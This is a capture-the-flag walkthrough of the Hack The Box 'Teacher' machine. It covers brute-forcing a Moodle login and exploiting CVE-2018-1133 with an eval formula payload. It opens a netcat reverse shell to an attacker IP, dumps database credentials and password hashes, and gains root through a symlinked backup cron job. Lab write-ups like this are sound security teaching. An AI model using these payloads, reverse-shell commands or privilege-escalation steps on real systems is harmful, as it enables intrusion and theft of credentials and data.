# Teacher: Easy

```sh
sudo vim /etc/hosts
# add teacher.htb

nmap -T4 -p- -A -Pn -v teacher.htb
```

* open ports & services:

    * 80/tcp: http: Apache httpd 2.4.25

* the webpage is a standard page for a highschool, and mentions that it has a new portal

* checking the source code of the webpage, we have a few links like '/gallery.html' and '/images'

* in the source code of '/gallery.html', one of the image files: '/images/5.png': has an additional attribute ```onerror="console.log('That\'s an F');"```; this is not found for any of the other images

* similarly, if we check in the '/images' directory, '5.png' stands out as it is smaller in size compared to other files

* trying to view the image file gives us the render error "the image cannot be displayed because it contains errors"

* we can check if the image file has any other content using ```curl```:

    ```sh
    curl http://teacher.htb/images/5.png
    # fetches the file content
    ```

* using ```curl```, we can see that the image file contains text content instead, and gives us the following note:

    ```txt
    Hi Servicedesk,

    I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.

    Could you guys figure out what the last charachter is, or just reset it?

    Thanks,
    Giovanni
    ```

    * this gives us two possible names: 'Servicedesk' and 'Giovanni'
    
    * the note also mentions the password starts with 'Th4C00lTheacha', and only the last character is missing

* we can continue checking for other directories or pages using web enumeration:

    ```sh
    feroxbuster -u http://teacher.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,md,js --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # dir scan with small wordlist

    ffuf -c -u 'http://teacher.htb' -H 'Host: FUZZ.teacher.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 20 -fs 8028 -s
    # subdomain scan
    ```

* the recursive directory scan using ```feroxbuster``` gives us a lot of pages: the key directories are '/manual' and '/moodle': and the rest of the results are the nested directories

* the '/manual' page leads to the landing page for Apache HTTP Server Version 2.4 Documentation: and includes a lot of documentation links

* the '/moodle' page leads to the Moodle portal: and it lists a single course for 'Algebra' by a teacher 'Giovanni Chhatta'

* trying to access any of the links leads to the Moodle login page: where we have options for logging in with username & password, a forgot username/password option, and login as guest

* after logging in via guest access, if we try to access the 'Algebra' course, we get a message saying that guest cannot access this course

* similarly, clicking on user profiles shows a message saying guests cannot access user profiles, and we need to log in with a user account to access it

* we can try to login as the user 'Giovanni' by trying the password with multiple last characters:

    * navigate to the Moodle login page at 'http://teacher.htb/moodle/login/index.php'

    * as we need to bruteforce only for a small set of strings, we can use Burp Suite Intruder

    * intercept a login request for username 'Giovanni', and the password 'Th4C00lTheacha': and send the request to Intruder

    * in the Intruder view, add a last character for the password, and add the position for the payload on the last character: this is where we will attempt replacing by multiple characters

    * in 'Payload type', select 'Simple list', and in 'Payload configuration', load the file ```/usr/share/seclists/Fuzzing/alphanum-case-extra.txt``` to test with all types of characters; also set the payload encoding option to disable URL-encoding

    * from the side panel, select the 'Resource Pool' option, selecting the default resource pool, and set the 'delay between requests' to 1000 milliseconds (1 second), in a fixed interval: this is to avoid timeout or redirects due to excessive login requests

    * now, we can start the Intruder attack

    * in the results tab, if we filter by length, one request stands out: with the password 'Th4C00lTheacha#'

    * if we use the creds 'Giovanni:Th4C00lTheacha#' in the login page, we are able to successfully login, and we have access to the dashboard page

* after logging as Giovanni, we are redirected to the dashboard page at '/moodle/my': we can explore the Moodle portal now for any context

* checking the messages at '/moodle/message/index.php', we can see a message is sent to the 'admin' user asking how to create a quiz

* checking the site home page, we can now check the 'Algebra' course: this leads us to 'http://teacher.htb/moodle/course/view.php?id=2'

* the course does not have any associated content like topics or participants

* similarly, if we check the link for the teacher from home page, we get the profile page at 'http://teacher.htb/moodle/user/profile.php?id=3'

* trying to change the 'id' parameter value for IDOR, for the course and the user profile, does not lead anywhere

* we can try to check for any exploits associated with the Moodle version, but the footer or source code does not show any version info

* Googling for how to find Moodle version info shows that we can check the file '/lib/upgrade.txt': this shows the latest release is 3.4

* Googling for exploits associated with Moodle 3.4 leads to results for [CVE-2018-1133: a RCE exploit from creating a calculated question](https://nvd.nist.gov/vuln/detail/CVE-2018-1133)

* searching for the CVE-2018-1133 exploit on Github leads to multiple exploits; trying to run [the PHP exploit from ExploitDB](https://www.exploit-db.com/exploits/46551) does not work: so we can try to follow the exploit manually:

    * log into Moodle, and navigate to the course 'ALG'

    * next, click on the Settings icon on top right for the course, and click on 'Turn editing on': this will enable editing for this course

    * next, in the first General panel (the one with 'Announcements'): select the option in the right corner for 'Add an activity or resource': and select the Quiz option

    * fill in the required fields: in this case only the 'name' is required, so we can name our quiz anything: and then save the changes

    * then, click on the newly created quiz, and click on 'edit quiz': this leads to 'http://teacher.htb/moodle/mod/quiz/edit.php?cmid=8' (the 'cmdid' parameter will differ)

    * click on the 'add' setting on the right corner, and select 'a new question': and double-click on 'a calculated question' which leads to the view for 'editing a calculated question'

    * for adding the calculated question, we can fill the required fields -

        * question name: 'test'
        * question text: 'test'
        * default mark: 1
        * answer 1 formula: ``` /*{a*/`$_GET[0]`;//{x}}``` (this wildcard is where the 'eval' function gets triggered)
        * grade: 100%
    
    * once the above fields are filled, click on 'save changes': this leads to the next page where we can choose the wildcard dataset properties

    * with the options set to default, navigate to the next page, where we get the view 'edit the wildcards datasets' at the link 'http://teacher.htb/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7' (the parameter values can differ)

    * we can append the payload with the command in the URL, for the parameter '0'

    * setup listener using ```nc -nvlp 4444```
    
    * then, right-click on the tab to duplicate it, and modify the URL with the following link:

        ```sh
        http://teacher.htb/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7&0=(busybox+nc+10.10.14.95+4444+-e+sh)
        # we can use any URL-encoded revshell one-liner, this works
        ```
    
    * this works and we get a reverse shell

* in reverse shell:

    ```sh
    id
    # www-data

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    ls -la

    ls -la /var/www
    # enumerate web dir

    ls -la /var/www/html

    ls -la /var/www/html/moodle
    # check all files

    cat /var/www/html/moodle/config.php

    ls -la /var/www/moodledata

    ls -la /

    ls -la /home
    # we have only one user 'giovanni'

    ls -la /home/giovanni
    # permission denied
    ```

* the file ```/var/www/html/moodle/config.php``` contains the MariaDB creds 'root:Welkom1!' for the 'moodle' DB

* checking the home directory shows that we have only one user 'giovanni'

* we can try re-using the password for 'giovanni' user using ```su giovanni``` but it fails

* we can try checking the MySQL service for any clues:

    ```sh
    ss -ltnp
    # shows two ports, 80 and 3306
    # 3306 is listening locally

    mysql -u root -pWelkom1! -e "show databases;"
    # we have two non-default DBs - 'moodle' and 'phpmyadmin'

    # check moodle DB
    mysql -u root -pWelkom1! -D moodle -e "show tables;"

    # check the 'mdl_user' table
    mysql -u root -pWelkom1! -D moodle -e "select * from mdl_user;"

    mysql -u root -pWelkom1! -D phpmyadmin -e "show tables;"

    mysql -u root -pWelkom1! -D phpmyadmin -e "select * from pma__users;"
    # no data
    ```

* MySQL has 2 non-default DBs: 'moodle' and 'phpmyadmin': the former contains some user data

* from the 'moodle' DB, the 'mdl_user' table gives us multiple hashes for these users:

    * guest: '$2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO'
    * admin: '$2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2'
    * giovanni: '$2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO'
    * Giovannibak: '7a860966115182402ed06375cf0a22af'

* we can try to crack the hashes for users other than 'giovanni', since the corresponding cleartext is known

* using online hash identifier tools, we find that the hashes for 'guest' and 'admin' are in the 'bcrypt' format; and the 'Giovannibak' hash is in MD5 format

* the MD5 hash can be cracked using [crackstation](https://crackstation.net/), and it gives us the cleartext 'expelled'

* if we try using this password 'expelled' to switch to 'giovanni', it works:

    ```sh
    su giovanni
    # this works

    cd

    ls -la

    cat user.txt
    # user flag

    # check other files

    ls -la .nano
    # executable by all
    # but no file contents

    ls -la work

    ls -la work/courses

    ls -la work/courses/algebra

    cat work/courses/algebra/answersAlgebra

    ls -la work/tmp

    ls -la work/tmp/backup_courses.tar.gz
    ```

* checking home directory of 'giovanni', we can see that there is a non-default 'work' folder, with folders for 'tmp' and 'courses'

* listing the 'tmp' folder contents show a file ```/home/giovanni/work/tmp/backup_courses.tar.gz```, which seems to be updated very recently

* listing it again for a few times shows that the file gets updated every minute: which means the archive file could be from a cronjob taking the backup of the 'courses' folder

* furthermore, the files inside the 'work' directory seem to be writable by 'giovanni'

* we can check the specific cronjob or scheduled command being run using ```pspy``` - fetch the executable from attacker:

    ```sh
    wget http://10.10.14.95:8000/pspy64

    chmod +x pspy64

    ./pspy64
    ```

* ```pspy``` shows that the following commands are run by the 'root' user every minute:

    ```sh
    /bin/sh -c /usr/bin/backup.sh

    tar -czvf tmp/backup_courses.tar.gz courses/algebra

    gzip

    tar -xf backup_courses.tar.gz
    ```

* now we can check if we have enough permissions to check the script:

    ```sh
    ls -la /usr/bin/backup.sh
    # we have read permissions

    cat /usr/bin/backup.sh
    ```

    ```sh
    #!/bin/bash
    cd /home/giovanni/work;
    tar -czvf tmp/backup_courses.tar.gz courses/*;
    cd tmp;
    tar -xf backup_courses.tar.gz;
    chmod 777 * -R;
    ```

* the backup script creates a archive of the 'courses' folder, then extracts the archive in the 'tmp' directory, and makes all files executable

* we can try abusing the wildcard character exploit for ```tar``` and ```chmod```, but that does not work

* as we have permissions to edit the 'courses' and 'tmp' folders, we can remove the original 'courses' folder, and create a new 'courses' symlink pointing to ```/root```

* so that when the cronjob runs it archives the ```/root``` directory contents and extracts it in 'tmp'

* we can modify the original folder and create the symlink:

    ```sh
    mv courses courses.bak
    # backup the original 'courses' dir

    ln -s /root courses
    # symlink '/root' to 'courses'

    # in a minute, the cronjob runs, extracts '/root' to 'tmp'

    ls -la tmp

    ls -la tmp/courses
    # we have root flag here

    cat tmp/courses/root.txt
    # root flag
    ```
